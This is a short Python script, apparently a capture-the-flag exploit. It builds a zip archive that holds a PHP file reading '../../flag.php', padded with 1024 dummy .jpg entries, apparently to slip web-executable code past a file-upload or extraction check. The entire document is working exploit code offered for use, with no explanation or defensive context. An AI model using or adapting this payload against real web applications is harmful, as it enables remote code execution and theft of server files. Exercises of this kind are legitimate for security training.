from uuid import uuid4
from zipfile import ZIP_DEFLATED, ZipFile


with ZipFile(f"bomb-{uuid4()}.zip", "w", ZIP_DEFLATED) as zf:
    zf.writestr(
        "test.php",
        """<?php
echo file_get_contents(__DIR__ . "/../../flag.php");
?>""",
    )
    for idx in range(1024):
        zf.writestr(f"{idx}.jpg", "0")
